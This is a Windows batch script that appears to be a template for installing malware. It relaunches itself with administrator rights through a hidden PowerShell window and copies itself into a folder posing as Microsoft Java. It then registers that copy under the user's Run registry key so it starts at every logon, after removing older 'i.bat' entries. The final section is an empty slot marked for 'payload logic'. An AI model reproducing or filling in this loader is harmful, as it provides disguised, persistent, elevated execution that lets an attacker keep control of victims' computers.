@echo off
:: Check if running from final destination
set "DEST=%LOCALAPPDATA%\Microsoft\Java\Java.bat"
set "SELF=%~f0"

:: If already running from destination, skip installation logic
if /I "%SELF%"=="%DEST%" goto :MAIN

:: Elevate if needed
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%SELF%' -Verb runAs"
    exit /b
)

:: Cleanup old entries
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "i.bat" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "i.bat" /f >nul 2>&1

:: Create new folder and copy self
mkdir "%LOCALAPPDATA%\Microsoft\Java" >nul 2>&1
copy "%SELF%" "%DEST%" >nul

:: Register as Java.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java.bat" /d "\"%DEST%\"" /f

:: Launch only ONCE
start "" "%DEST%"
exit

:MAIN
:: ✅ Normal logic here — only runs once from correct location
:: Add your payload logic below
echo [✓] Java.bat is installed and ready.
exit
